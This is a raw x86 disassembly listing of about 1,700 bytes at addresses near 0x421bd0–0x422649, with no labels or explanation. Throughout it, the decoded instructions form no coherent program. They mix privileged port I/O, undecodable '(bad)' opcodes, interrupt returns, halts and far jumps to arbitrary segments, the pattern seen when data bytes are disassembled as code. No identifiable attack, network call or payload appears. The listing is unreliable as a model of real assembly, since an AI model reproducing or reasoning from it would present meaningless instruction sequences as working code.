  421bd0:	out    0x20,eax
  421bd2:	out    dx,eax
  421bd3:	cld    
  421bd4:	adc    bl,ch
  421bd6:	jecxz  0x421bae
  421bd8:	mov    eax,0x82005175
  421bdd:	cmp    edi,DWORD PTR [ebx+0x3d111843]
  421be3:	outs   dx,BYTE PTR ds:[esi]
  421be4:	inc    ecx
  421be5:	mov    es,WORD PTR [eax+0x170e4a32]
  421beb:	push   0xdc4bedb9
  421bf0:	mov    bh,0x40
  421bf2:	test   eax,0xa2b44b48
  421bf7:	dec    edi
  421bf8:	xchg   esi,eax
  421bf9:	stc    
  421bfa:	jmp    0x3824fbf1
  421bff:	clc    
  421c00:	stc    
  421c01:	pop    ebp
  421c02:	or     BYTE PTR [eax],cl
  421c04:	js     0x421c06
  421c06:	jmp    0x421c0d
  421c08:	add    al,0x1e
  421c0a:	pop    ecx
  421c0b:	jne    0x421b9f
  421c0d:	pop    ebx
  421c0e:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  421c10:	fsubr  QWORD PTR [ebx-0x1d6f389b]
  421c16:	pop    es
  421c17:	call   0x6d18:0x5e35cac0
  421c1e:	xor    ecx,esi
  421c20:	test   DWORD PTR [eax-0x67],esi
  421c23:	xlat   BYTE PTR ds:[ebx]
  421c24:	mov    cl,bl
  421c26:	sub    DWORD PTR [edi+ecx*4+0xa54b8ce],edi
  421c2d:	out    dx,al
  421c2e:	or     eax,0xfcfe6a17
  421c33:	imul   edx,ebp,0x78
  421c36:	aad    0x75
  421c38:	or     eax,0x69e57ee9
  421c3d:	call   0x10af:0xa8b2ba38
  421c44:	hlt    
  421c45:	push   es
  421c46:	fst    st(5)
  421c48:	out    0x6c,al
  421c4a:	push   ebx
  421c4b:	pop    esp
  421c4c:	mov    edi,0x96562ac3
  421c51:	mov    ebx,0xff68c76c
  421c56:	fisubr DWORD PTR [ecx+0x5eac78ef]
  421c5c:	jmp    0x421c94
  421c5e:	mov    eax,0xe8a45e5a
  421c63:	xlat   BYTE PTR ds:[ebx]
  421c64:	imul   ebp,esp,0xfcd74341
  421c6a:	gs adc dl,BYTE PTR ds:[edx-0x4d70ce37]
  421c72:	or     eax,0xcdf662fb
  421c77:	shl    BYTE PTR [ecx-0x62],1
  421c7a:	mov    dh,0x8f
  421c7c:	adc    ecx,edx
  421c7e:	dec    ecx
  421c7f:	ret    
  421c80:	out    dx,eax
  421c81:	add    BYTE PTR [edx+0x71],cl
  421c84:	iret   
  421c85:	add    cl,ch
  421c87:	popa   
  421c88:	mov    bh,0x9f
  421c8a:	nop
  421c8b:	mov    cl,0xa4
  421c8d:	scas   eax,DWORD PTR es:[edi]
  421c8e:	sub    al,0x9a
  421c90:	stos   BYTE PTR es:[edi],al
	...
  421cf1:	add    BYTE PTR [eax],al
  421cf3:	add    BYTE PTR [eax-0x1a4a95],dh
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	jns    0x421d17
  421d02:	mov    ch,0xf8
  421d04:	shr    BYTE PTR [eax+0x1],0x0
  421d08:	add    eax,0x54000001
  421d0d:	mov    esp,0x37b471a9
  421d12:	or     esp,DWORD PTR [edx-0x6b3a1c7e]
  421d18:	addr16 jmp 0x704f:0x7a42d9c7
  421d20:	loopne 0x421d32
  421d22:	call   0x9608dd56
  421d27:	mov    ds:0x9fb611c4,eax
  421d2c:	clc    
  421d2d:	cmp    edi,DWORD PTR [ebx-0x6dadfdce]
  421d33:	sar    BYTE PTR [ebp+0x32497960],cl
  421d39:	dec    edx
  421d3a:	push   eax
  421d3b:	mov    ecx,0x134897f5
  421d40:	shr    BYTE PTR [eax-0x73],cl
  421d43:	add    bl,BYTE PTR [edx+esi*1-0x509a6322]
  421d4a:	push   cs
  421d4b:	add    ah,ch
  421d4d:	pushf  
  421d4e:	mov    bh,0xad
  421d50:	cli    
  421d51:	push   eax
  421d52:	jmp    0xc1f6:0x294d7046
  421d59:	ret    0x6668
  421d5c:	sub    ebp,edx
  421d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d5f:	mov    esp,0x7ff7508d
  421d64:	cmp    bh,BYTE PTR [ebx+0x7f]
  421d67:	fsubr  QWORD PTR [edx+0x6f]
  421d6a:	ins    DWORD PTR es:[edi],dx
  421d6b:	or     eax,DWORD PTR [ecx+0x76c7b9e]
  421d71:	out    dx,al
  421d72:	sbb    ecx,DWORD PTR [ebx]
  421d74:	xor    eax,0xce8738d4
  421d79:	sub    ecx,ebx
  421d7b:	retf   
  421d7c:	sub    ebp,DWORD PTR [edx+0x12]
  421d7f:	add    al,BYTE PTR [edi+0x79]
  421d82:	jo     0x421e02
  421d84:	sub    ah,BYTE PTR [ebx-0x76]
  421d87:	jbe    0x421dba
  421d89:	jae    0x421d56
  421d8b:	push   esi
  421d8c:	int3   
  421d8d:	jecxz  0x421d1f
  421d8f:	push   es
  421d90:	xchg   edi,eax
  421d91:	and    al,0x2d
  421d93:	(bad)  
  421d95:	dec    eax
  421d96:	jne    0x421dfa
  421d98:	fld    TBYTE PTR fs:[edx+0x79]
  421d9c:	adc    ebp,DWORD PTR [edx-0x61eb178b]
  421da2:	int3   
  421da3:	jmp    0x83a7:0xb37af352
  421daa:	shl    BYTE PTR [eax+0x9],cl
  421dad:	inc    eax
  421dae:	inc    edi
  421daf:	push   eax
  421db0:	cld    
  421db1:	loop   0x421dd4
  421db3:	aas    
  421db4:	repnz imul edx,DWORD PTR [ecx],0x123730b2
  421dbb:	pop    edi
  421dbc:	ret    
  421dbd:	mov    ah,0x4a
  421dbf:	mov    ch,0x30
  421dc1:	fnstcw WORD PTR [edx+esi*2-0x2]
  421dc5:	jns    0x421dcb
  421dc7:	nop
  421dc8:	adc    BYTE PTR [ebp+0x6a],ch
  421dcb:	jb     0x421d4f
  421dcd:	add    cl,cl
  421dcf:	aad    0xc7
  421dd1:	rol    BYTE PTR [ebp-0x69],0xb4
  421dd5:	inc    ecx
  421dd6:	xchg   edi,eax
  421dd7:	push   0x2e
  421dd9:	retf   0xd9b3
  421ddc:	es jb  0x421d93
  421ddf:	fdiv   st,st(4)
  421de1:	push   cs
  421de2:	inc    esi
  421de3:	ret    
  421de4:	mov    esi,0xdbe05234
  421de9:	aaa    
  421dea:	jne    0x421d82
  421dec:	or     esp,DWORD PTR [ebp-0x29]
  421def:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421df0:	ja     0x421e08
  421df2:	mov    WORD PTR [ebp+eiz*4+0x32],fs
  421df6:	sbb    DWORD PTR [esi-0x66],0x4f
  421dfa:	mov    dh,0xa1
  421dfc:	in     eax,dx
  421dfd:	ret    
  421dfe:	adc    esi,edi
  421e00:	sar    BYTE PTR [ecx-0x5a430c90],1
  421e06:	daa    
  421e07:	in     eax,dx
  421e08:	(bad)  
  421e09:	adc    DWORD PTR [ebx],eax
  421e0b:	sub    esp,DWORD PTR [eax]
  421e0d:	cmp    eax,0x99807c
	...
  421e72:	add    BYTE PTR [eax],al
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	inc    edx
  421e81:	jae    0x421e28
  421e83:	adc    eax,ebp
  421e85:	imul   eax,DWORD PTR [ecx],0x10500
  421e8b:	add    dh,al
  421e8d:	sti    
  421e8e:	int    0xfe
  421e90:	mov    ?,WORD PTR [ecx-0x26b39284]
  421e96:	es or  eax,0x2ad198da
  421e9c:	xor    BYTE PTR [esi-0x2ed537b3],cl
  421ea2:	aad    0x7b
  421ea4:	pop    ss
  421ea5:	cmp    ch,BYTE PTR [edx+0x18]
  421ea8:	ja     0x421f1d
  421eaa:	and    DWORD PTR [esi+0x37],ebx
  421ead:	test   BYTE PTR [ebp+esi*8-0x2cb11339],dl
  421eb4:	jne    0x421eca
  421eb6:	fist   WORD PTR [edx*1-0x70eddff3]
  421ebd:	push   eax
  421ebe:	loope  0x421efe
  421ec0:	cmp    BYTE PTR [ecx+0x48c4ef75],0xc7
  421ec7:	inc    esp
  421ec8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ec9:	mov    eax,0x2ef8a919
  421ece:	js     0x421e87
  421ed0:	dec    ecx
  421ed1:	lahf   
  421ed2:	out    0x8a,eax
  421ed4:	add    DWORD PTR ds:0xa51cd8bd,esi
  421eda:	pushf  
  421edb:	pop    ds
  421edc:	lods   al,BYTE PTR ds:[esi]
  421edd:	xor    esp,esp
  421edf:	imul   ebp,DWORD PTR [ebx-0x317f3d9b],0x12
  421ee6:	jbe    0x421ead
  421ee8:	inc    eax
  421ee9:	inc    ebx
  421eea:	pop    ecx
  421eeb:	jp     0x421ea0
  421eed:	ins    DWORD PTR es:[edi],dx
  421eee:	xor    BYTE PTR [esi],0x5
  421ef1:	gs jmp 0xe65:0xd231a0e0
  421ef9:	into   
  421efa:	push   eax
  421efb:	and    edx,DWORD PTR [eax+0x7e]
  421efe:	call   FWORD PTR ds:0x3abb35ec
  421f04:	rcr    BYTE PTR [esi+0x13],cl
  421f07:	xor    dl,BYTE PTR [esi+edi*8-0x514e50b2]
  421f0e:	push   esp
  421f0f:	lahf   
  421f10:	pop    ecx
  421f11:	icebp  
  421f12:	mov    bh,0xe0
  421f14:	jnp    0x421f79
  421f16:	data16 int 0xb7
  421f19:	pusha  
  421f1a:	ins    DWORD PTR es:[edi],dx
  421f1b:	retf   
  421f1c:	or     esp,DWORD PTR [edx-0x1a]
  421f1f:	pop    ebp
  421f20:	jbe    0x421f98
  421f22:	push   cs
  421f23:	fcomp  DWORD PTR [esi+0x4c259bd]
  421f29:	repz pop edi
  421f2b:	lahf   
  421f2c:	mov    esi,0x2896ead4
  421f31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f32:	test   eax,0x653c8885
  421f37:	neg    DWORD PTR [edi]
  421f39:	mov    ecx,0x4b93705e
  421f3e:	fwait
  421f3f:	cli    
  421f40:	adc    edi,DWORD PTR [esi-0x791c6379]
  421f46:	test   DWORD PTR [esi+ebp*8+0x4c60738d],eax
  421f4d:	popf   
  421f4e:	ja     0x421f99
  421f50:	push   eax
  421f51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f52:	cmp    DWORD PTR [edx-0x70bbddc2],ecx
  421f58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f59:	loopne 0x421f4c
  421f5b:	jne    0x421f12
  421f5d:	adc    DWORD PTR ds:0x1ef2aa76,edx
  421f63:	push   ss
  421f64:	pop    edi
  421f65:	sub    al,0x2e
  421f67:	pop    ecx
  421f68:	ror    BYTE PTR [esi-0x6a902c9f],cl
  421f6e:	jp     0x421f8a
  421f70:	in     eax,0x57
  421f72:	jo     0x421f25
  421f74:	sub    al,0xc9
  421f76:	pop    edx
  421f77:	mov    bl,0xb5
  421f79:	sahf   
  421f7a:	or     BYTE PTR gs:[ecx+0x485fa2c6],0x3e
  421f82:	jmp    0x4fb79dfb
  421f87:	aam    0x49
  421f89:	mov    ah,0xba
  421f8b:	ficomp WORD PTR [edi+0x35]
  421f8e:	xor    eax,DWORD PTR ds:0x1d
	...
  421ff4:	imul   eax,DWORD PTR [esi],0xffffff8f
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	ror    WORD PTR [edi+0x6acaf2d4],1
  422006:	add    DWORD PTR [eax],eax
  422008:	add    eax,0x7000001
  42200d:	add    DWORD PTR [ebx],esp
  42200f:	nop
  422010:	xor    esp,ebx
  422012:	xchg   esp,eax
  422013:	xor    DWORD PTR [edi],esi
  422015:	sub    esi,DWORD PTR [edx-0x7eb8dcb8]
  42201b:	fs mov esp,0x3137c332
  422021:	mov    fs,WORD PTR [ebp+0x68]
  422024:	cmp    ebx,edx
  422026:	push   ds
  422027:	mov    esi,0xa2069f1
  42202c:	add    DWORD PTR [eax-0x22356e06],0xbaa54005
  422036:	aas    
  422037:	dec    esp
  422038:	jg     0x421ff8
  42203a:	inc    esp
  42203b:	jecxz  0x422092
  42203d:	ds mov dl,0xbb
  422040:	pop    ecx
  422041:	jb     0x421fff
  422043:	dec    ecx
  422044:	arpl   WORD PTR [eax-0x30890bc2],sp
  42204a:	add    eax,DWORD PTR ds:[edi-0x79d9ed00]
  422051:	out    0xfd,al
  422053:	jno    0x422044
  422055:	bound  esi,QWORD PTR [eax-0x5e]
  422058:	sti    
  422059:	fimul  DWORD PTR [ebp-0x1ebb3cf6]
  42205f:	pop    ecx
  422060:	jbe    0x422097
  422062:	mov    ds:0xbd791639,al
  422067:	cmp    cl,BYTE PTR [esi]
  422069:	sub    BYTE PTR [ecx-0x4c],0x2a
  42206d:	aad    0xf2
  42206f:	add    bl,BYTE PTR [ecx+0x37]
  422072:	scas   al,BYTE PTR es:[edi]
  422073:	int    0x63
  422075:	test   eax,0x2449c311
  42207a:	push   cs
  42207b:	jne    0x422035
  42207d:	stos   DWORD PTR es:[edi],eax
  42207e:	dec    eax
  42207f:	inc    edi
  422080:	xor    edi,ebx
  422082:	or     dh,BYTE PTR [ebx+esi*1+0x2f2d5122]
  422089:	cdq    
  42208a:	ins    DWORD PTR es:[edi],dx
  42208b:	data16 sar ch,1
  42208e:	int    0x1b
  422090:	cwde   
  422091:	mov    ds:0x32243311,al
  422096:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422097:	ja     0x4220cb
  422099:	ds push esp
  42209b:	xchg   esp,eax
  42209c:	jmp    0x4220d3
  42209e:	retf   0xf7f2
  4220a1:	mov    WORD PTR [ebx-0x61],gs
  4220a4:	xor    ecx,0xfbb6b3b4
  4220aa:	in     eax,0x99
  4220ac:	popf   
  4220ad:	pop    es
  4220ae:	mov    ds:0xd232940d,eax
  4220b3:	enter  0x5d04,0xd9
  4220b7:	push   es
  4220b8:	mov    ds:0x254670b,eax
  4220bd:	adc    eax,edx
  4220bf:	xchg   esi,eax
  4220c0:	ret    
  4220c1:	fwait
  4220c2:	rcl    ebp,0x22
  4220c5:	in     al,0xfa
  4220c7:	jnp    0x42205f
  4220c9:	adc    BYTE PTR [edx],ch
  4220cb:	xor    bh,BYTE PTR [eax+0x71031424]
  4220d1:	test   DWORD PTR [eax],ecx
  4220d3:	test   BYTE PTR [edx-0x1d],dh
  4220d6:	sbb    DWORD PTR [edx],ebx
  4220d8:	lods   eax,DWORD PTR ds:[esi]
  4220d9:	lds    ebx,FWORD PTR [ebx+0x303e80e4]
  4220df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220e1:	xor    al,0x70
  4220e3:	outs   dx,BYTE PTR ds:[esi]
  4220e4:	sub    al,0xfc
  4220e6:	fdiv   QWORD PTR [ebp-0x33]
  4220e9:	mov    ds:0x6d48be74,al
  4220ee:	push   0x11c0bb54
  4220f3:	mov    cl,0x46
  4220f5:	ret    
  4220f6:	mov    eax,ds:0xb688b694
  4220fb:	jns    0x422119
  4220fd:	jmp    0xae6864ed
  422102:	cdq    
  422103:	repz xchg ebx,eax
  422105:	nop
  422106:	lahf   
  422107:	mov    dh,0xc7
  422109:	sbb    edx,DWORD PTR ds:0xd3a43b95
  42210f:	xchg   ecx,eax
  422110:	mov    BYTE PTR [eax],al
	...
  422172:	add    BYTE PTR [eax],al
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    eax,DWORD PTR [edx-0x6e]
  422182:	push   ds
  422183:	(bad)  
  422184:	iret   
  422185:	imul   eax,DWORD PTR [ecx],0x0
  422188:	add    eax,0xd8000001
  42218d:	add    BYTE PTR [ecx-0x1e59275c],0x1f
  422194:	adc    BYTE PTR [edx],bl
  422196:	mov    ds:0xd55c9dae,eax
  42219b:	dec    ebp
  42219c:	or     al,0x1
  42219e:	push   cs
  42219f:	test   al,0x38
  4221a1:	popw   ss
  4221a3:	or     dl,BYTE PTR [edi-0x6f]
  4221a6:	push   esi
  4221a7:	pop    edx
  4221a8:	hlt    
  4221a9:	pop    esp
  4221aa:	xchg   ecx,eax
  4221ab:	xor    BYTE PTR ds:0x520a1f77,bl
  4221b1:	jbe    0x422219
  4221b3:	jnp    0x42220e
  4221b5:	pop    ecx
  4221b6:	mov    ecx,0x5e68010f
  4221bb:	fsub   DWORD PTR [ecx]
  4221bd:	xor    edx,DWORD PTR [esi-0x52]
  4221c0:	mov    ch,0x63
  4221c2:	cmp    BYTE PTR [ebp+edi*2-0x640e9ebf],bh
  4221c9:	sbb    BYTE PTR [ecx],ah
  4221cb:	push   DWORD PTR [ecx-0x3d]
  4221ce:	and    DWORD PTR [ebx-0x2b2a6630],ebp
  4221d4:	push   ds
  4221d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221d6:	loop   0x4221b5
  4221d8:	pop    ss
  4221d9:	into   
  4221da:	push   cs
  4221db:	inc    ebp
  4221dc:	out    dx,al
  4221dd:	sbb    BYTE PTR [ebp*4+0x417ed7a4],ch
  4221e4:	xor    ah,BYTE PTR [eax+0xb267db9]
  4221ea:	retf   
  4221eb:	inc    ebx
  4221ec:	jecxz  0x42224b
  4221ee:	push   esi
  4221ef:	mov    ds:0x2d70454b,eax
  4221f4:	loope  0x4221a0
  4221f6:	bound  eax,QWORD PTR [esi]
  4221f8:	or     DWORD PTR [edi-0x4f0137f6],ecx
  4221fe:	jp     0x4221f5
  422200:	mov    WORD PTR [ebp-0x6608f48f],gs
  422206:	jmp    0x90ce:0x412bd26
  42220d:	pop    ebp
  42220e:	and    eax,0xdf439684
  422213:	mov    bh,0x44
  422215:	outs   dx,BYTE PTR ds:[esi]
  422216:	adc    al,0x82
  422218:	sub    BYTE PTR [ebx+eax*8+0x35],bl
  42221c:	xor    al,BYTE PTR [eax]
  42221e:	in     eax,0xf2
  422220:	push   esi
  422221:	add    ebp,DWORD PTR [ebx-0x3b788931]
  422227:	ss (bad) 
  422229:	cmp    BYTE PTR [ecx+0x3f],bh
  42222c:	scas   al,BYTE PTR es:[edi]
  42222d:	arpl   WORD PTR [ebx+0x79],sp
  422230:	push   es
  422231:	cmp    BYTE PTR [ebp+0x1f],dh
  422234:	pop    ds
  422235:	inc    ebx
  422236:	mov    edi,0x7e96f8b5
  42223b:	outs   dx,BYTE PTR ds:[esi]
  42223c:	and    al,0x39
  42223e:	loope  0x4222b4
  422240:	int    0x82
  422242:	pop    ecx
  422243:	fnsave [edi]
  422245:	inc    ebp
  422246:	test   BYTE PTR [ebx+edi*2],dl
  422249:	push   0x9df63160
  42224e:	push   0x736ce1b8
  422253:	cdq    
  422254:	sbb    al,0x41
  422256:	stos   DWORD PTR es:[edi],eax
  422257:	sbb    al,0x99
  422259:	and    BYTE PTR [edx+edi*4+0x284fd257],al
  422260:	push   ebx
  422261:	in     eax,0x70
  422263:	aad    0x5f
  422265:	push   eax
  422266:	xor    BYTE PTR [edx],ch
  422268:	(bad)
  42226b:	mov    esi,0x7a3b096c
  422270:	cdq    
  422271:	mov    edx,0x8fef010a
  422276:	push   ebx
  422277:	cmp    eax,0x43ee8dda
  42227c:	xchg   edx,eax
  42227d:	popf   
  42227e:	test   al,0xce
  422280:	add    eax,0xf6fb97c4
  422285:	cmp    al,BYTE PTR [ebp+0x19]
  422288:	xchg   ebx,eax
  422289:	mov    edi,0x1c2bf4a9
  42228e:	cwde   
  42228f:	mov    edi,0xab
	...
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	pop    esp
  422301:	jb     0x42228e
  422303:	dec    ebp
  422304:	aam    0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    eax,0x34000001
  42230d:	xor    ecx,DWORD PTR [ebx+esi*1]
  422310:	fcmovnu st,st(7)
  422312:	fdiv   DWORD PTR [eax+ebx*8+0x52799a0f]
  422319:	dec    ebx
  42231a:	and    ebp,0xf
  42231d:	test   al,0x41
  42231f:	cmp    ebp,ebp
  422321:	(bad)  
  422322:	xor    DWORD PTR [ecx-0x7af8a3a7],ebx
  422328:	push   cs
  422329:	ret    
  42232a:	push   edi
  42232b:	sbb    BYTE PTR [eax+ebp*2+0x2beffdea],dl
  422332:	mov    ah,BYTE PTR [esi-0x1e52029b]
  422338:	not    ch
  42233a:	icebp  
  42233b:	out    0x16,al
  42233d:	in     al,dx
  42233e:	lds    eax,FWORD PTR [esi]
  422340:	mov    al,0x6f
  422342:	mov    edx,0xf102b75e
  422347:	ret    0xdc9d
  42234a:	xor    esi,esi
  42234c:	jae    0x4222e5
  42234e:	and    DWORD PTR [ecx-0x3f84139c],ecx
  422354:	or     esp,DWORD PTR [edx+0x49]
  422357:	xor    ecx,DWORD PTR [edx-0x68c95b29]
  42235d:	mov    esi,esp
  42235f:	sar    DWORD PTR [edi-0x292f2bea],0x13
  422366:	fstp   DWORD PTR [eax]
  422368:	sub    BYTE PTR [ebx-0x78b89a9e],al
  42236e:	add    al,0xac
  422370:	data16 fbstp TBYTE PTR ds:0x6a66838
  422377:	and    BYTE PTR [eax+0x4b],0x5a
  42237b:	retf   0x6ecf
  42237e:	fnstcw WORD PTR [eax+0x5fdcfef1]
  422384:	jb     0x4223a4
  422386:	or     al,0x68
  422388:	jmp    0x8001ae1
  42238d:	inc    ebx
  42238e:	sbb    eax,0x967666ba
  422393:	(bad)  
  422394:	js     0x422320
  422396:	xchg   edi,eax
  422397:	stos   DWORD PTR es:[edi],eax
  422398:	jns    0x422416
  42239a:	jne    0x422418
  42239c:	scas   eax,DWORD PTR es:[edi]
  42239d:	add    bh,0xd7
  4223a0:	xchg   ch,bh
  4223a2:	push   ds
  4223a3:	int    0xf7
  4223a5:	cmc    
  4223a6:	pop    edi
  4223a7:	out    dx,eax
  4223a8:	mov    BYTE PTR [ebx+eax*4+0x4a84b8ae],dh
  4223af:	cmc    
  4223b0:	pop    ds
  4223b1:	push   ebp
  4223b3:	mov    eax,0x83f08575
  4223b8:	add    BYTE PTR [ebx-0x2fcf44a4],bh
  4223be:	sub    bl,BYTE PTR [edi-0x257eea9c]
  4223c4:	(bad)
  4223c7:	add    eax,0x1526add4
  4223cc:	inc    ebp
  4223cd:	xor    al,0x74
  4223cf:	add    DWORD PTR [edi],0x2a0fa214
  4223d5:	mov    dl,0xd2
  4223d7:	lahf   
  4223d8:	push   ds
  4223d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4223da:	hlt    
  4223db:	dec    ebp
  4223dc:	pop    es
  4223dd:	fisub  DWORD PTR [ebp+0x1d45492e]
  4223e3:	mov    al,0x2a
  4223e5:	add    al,0x19
  4223e7:	test   eax,0x10264c82
  4223ec:	cli    
  4223ed:	dec    esp
  4223ee:	sbb    eax,0x84fc098
  4223f4:	loope  0x422379
  4223f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223f7:	sbb    al,0xea
  4223f9:	sbb    BYTE PTR [ebp-0x73],bl
  4223fc:	push   ss
  4223fd:	cld    
  4223fe:	out    dx,al
  4223ff:	jne    0x4223dd
  422401:	cmp    al,0xe0
  422403:	push   ds
  422404:	xchg   edi,eax
  422405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422406:	dec    edx
  422407:	inc    eax
  422408:	pop    ebx
  422409:	xchg   ebp,eax
  42240a:	sar    DWORD PTR [eax-0x4d],0x3
  42240e:	(bad)  ds:0xb0
	...
  422474:	push   edx
  422475:	sub    BYTE PTR [esi],0x69
  422478:	(bad)  
  422479:	in     eax,dx
  42247a:	push   edi
  42247b:	mov    ebx,0x99e531bb
  422480:	dec    edx
  422481:	inc    edx
  422482:	into   
  422483:	(bad)  
  422484:	fldcw  WORD PTR [ebp+0x1]
  422487:	add    BYTE PTR ds:0x6000001,al
  42248d:	iret   
  42248e:	adc    DWORD PTR [ebp+esi*1+0x2f7217e7],edx
  422495:	jle    0x4224db
  422497:	inc    edi
  422498:	mov    eax,0x17b8384f
  42249d:	cdq    
  42249e:	ins    BYTE PTR es:[edi],dx
  42249f:	lock xor al,0xfe
  4224a2:	retf   
  4224a3:	inc    esp
  4224a4:	xchg   esi,eax
  4224a5:	iret   
  4224a6:	and    edx,DWORD PTR [ebx+eiz*8]
  4224a9:	push   0xf097e011
  4224ae:	or     al,BYTE PTR [esi]
  4224b0:	jle    0x422493
  4224b2:	shl    DWORD PTR [ebx-0x3a],cl
  4224b5:	test   eax,0x2af77d37
  4224ba:	xchg   ebp,eax
  4224bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4224bc:	dec    edi
  4224bd:	hlt    
  4224be:	scas   al,BYTE PTR es:[edi]
  4224bf:	pop    ebx
  4224c0:	cs ss push esp
  4224c3:	outs   dx,BYTE PTR ds:[esi]
  4224c4:	cli    
  4224c5:	cmp    dh,BYTE PTR [ebp+0x47]
  4224c8:	pop    edi
  4224c9:	dec    edi
  4224ca:	dec    esi
  4224cb:	int3   
  4224cc:	(bad)  
  4224cd:	imul   edi,DWORD PTR [edx+0xbc1fc55],0xf7379458
  4224d7:	xchg   ecx,eax
  4224d8:	jb     0x422559
  4224da:	out    dx,eax
  4224db:	xchg   edi,eax
  4224dc:	pop    esp
  4224dd:	cld    
  4224de:	cwde   
  4224df:	cmp    dh,0x35
  4224e2:	out    0xe6,al
  4224e4:	int3   
  4224e5:	das    
  4224e6:	dec    esi
  4224e7:	stc    
  4224e8:	int3   
  4224e9:	adc    edx,0xffffff96
  4224ec:	mov    al,ds:0x224e1317
  4224f1:	cli    
  4224f2:	xor    DWORD PTR [ebx],esp
  4224f4:	(bad)  
  4224f5:	arpl   WORD PTR [eax+0x40],cx
  4224f8:	mov    es,WORD PTR [ebx+0x15d5f0ac]
  4224fe:	das    
  4224ff:	aaa    
  422500:	sub    ah,cl
  422502:	adc    DWORD PTR [eax-0x7652e9bd],ebp
  422508:	cs dec esi
  42250a:	jbe    0x4224e8
  42250c:	std    
  42250d:	xchg   dh,dh
  42250f:	aaa    
  422510:	aaa    
  422511:	repnz out dx,al
  422513:	in     eax,dx
  422514:	xchg   ecx,eax
  422515:	mov    edx,0x566acf45
  42251a:	pop    ss
  42251b:	jmp    0x422551
  42251d:	add    al,0x2e
  42251f:	mov    ss,ebx
  422521:	imul   esi,edi,0x53
  422524:	fisubr WORD PTR [ecx+ebx*1]
  422527:	sbb    ecx,DWORD PTR [ecx-0x4eeeef59]
  42252d:	popf   
  42252e:	rol    BYTE PTR [ecx-0x7e],1
  422531:	call   0x31c9:0x21e3cdf4
  422538:	push   esi
  422539:	jbe    0x42250d
  42253b:	mov    eax,ds:0x4dbc6e82
  422540:	cmp    eax,0x7f30bdd
  422545:	mov    ecx,ebx
  422547:	xor    BYTE PTR [eax-0x7c],dl
  42254a:	mov    eax,es
  42254c:	xor    ecx,esp
  42254e:	imul   BYTE PTR [ebx]
  422550:	dec    cl
  422552:	ret    0x97f8
  422555:	std    
  422556:	hlt    
  422557:	sar    BYTE PTR [ebx-0x70],0xf3
  42255b:	dec    ebp
  42255c:	imul   esp,ebx,0x39
  42255f:	xchg   BYTE PTR [eax+eax*2],ah
  422562:	loop   0x42253d
  422564:	pop    es
  422565:	lahf   
  422566:	jns    0x4225d7
  422568:	pushf  
  422569:	push   esp
  42256a:	ret    
  42256b:	cld    
  42256c:	push   edx
  42256d:	or     eax,0x7bc8fe9b
  422572:	in     eax,dx
  422573:	add    eax,0x44e37fd0
  422578:	jno    0x42251c
  42257a:	and    BYTE PTR [ebp-0x177287c3],0xb6
  422581:	mov    al,ds:0x6eb7e4e2
  422586:	dec    edx
  422587:	ss stc 
  422589:	mov    cl,bh
  42258b:	sub    eax,0x1e651fda
  422590:	inc    esp
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x663ca2f8]
  422602:	cmp    cl,BYTE PTR [esi+ebx*8]
  422605:	outs   dx,BYTE PTR ds:[esi]
  422606:	add    DWORD PTR [eax],eax
  422608:	add    eax,0x69000001
  42260d:	jecxz  0x422605
  42260f:	xchg   BYTE PTR [eax-0x2b],dh
  422612:	imul   eax,esp,0xf
  422615:	add    bh,BYTE PTR [ebp-0x46075fee]
  42261b:	jne    0x4225d7
  42261d:	loopne 0x422652
  42261f:	ds xchg ch,ah
  422622:	xchg   ecx,eax
  422623:	pop    esp
  422624:	setns  BYTE PTR [esi-0x2c]
  422628:	in     al,0x55
  42262a:	add    DWORD PTR [edx-0xd],ecx
  42262d:	dec    esp
  42262e:	sub    dl,BYTE PTR [ebx+ebp*8+0x6745197d]
  422635:	fdivr  QWORD PTR [edi]
  422637:	inc    eax
  422638:	sahf   
  422639:	jl     0x4225e8
  42263b:	push   ds
  42263c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42263d:	mov    esp,0xf3f48926
  422642:	jo     0x422677
  422644:	icebp  
  422645:	sub    al,BYTE PTR [edx]
  422647:	int3   
  422648:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422649:	pop    edx
